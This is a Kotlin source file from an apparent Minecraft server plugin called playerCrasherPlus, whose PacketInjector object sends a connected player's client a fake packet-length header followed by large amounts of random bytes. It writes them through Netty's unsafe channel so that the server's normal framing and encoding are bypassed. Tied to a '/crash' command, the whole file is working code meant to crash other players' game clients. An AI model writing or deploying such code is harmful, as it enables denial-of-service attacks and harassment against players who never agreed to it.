package io.github.earth1283.playerCrasherPlus

import io.netty.buffer.ByteBuf
import org.bukkit.entity.Player
import org.bukkit.plugin.java.JavaPlugin
import java.util.concurrent.ThreadLocalRandom

object PacketInjector {

    fun blast(plugin: JavaPlugin, player: Player, totalBytes: Long) {
        val channel = NettyUtil.resolveChannel(player)
        if (channel == null) {
            plugin.logger.warning("Could not reach netty channel for ${player.name}, skipping /crash")
            return
        }

        val cfg = plugin.config
        val minHeader = cfg.getInt("fake-header.min-bytes", 2048)
        val maxHeader = cfg.getInt("fake-header.max-bytes", 4096)
        val chunkSize = cfg.getInt("fill-chunk-bytes", 8192).coerceAtLeast(1)
        val random = ThreadLocalRandom.current()
        val fakeLength = if (maxHeader > minHeader) random.nextInt(minHeader, maxHeader) else minHeader

        channel.eventLoop().execute {
            try {
                val buf = channel.alloc().buffer()
                writeVarInt(buf, fakeLength)

                val chunk = ByteArray(chunkSize)
                var remaining = totalBytes
                while (remaining > 0) {
                    val n = minOf(remaining, chunkSize.toLong()).toInt()
                    random.nextBytes(chunk)
                    buf.writeBytes(chunk, 0, n)
                    remaining -= n
                }

                // bypass the whole MC pipeline (splitter/decoder/prepender/compress/encoder)
                // so nothing re-frames or "corrects" the fake length we just wrote
                channel.unsafe().write(buf, channel.voidPromise())
                channel.unsafe().flush()
            } catch (e: Exception) {
                plugin.logger.warning("Packet injection failed for ${player.name}: ${e.message}")
            }
        }
    }

    private fun writeVarInt(buf: ByteBuf, valueIn: Int) {
        var value = valueIn
        while (true) {
            if (value and 0x7F.inv() == 0) {
                buf.writeByte(value)
                return
            }
            buf.writeByte(value and 0x7F or 0x80)
            value = value ushr 7
        }
    }
}
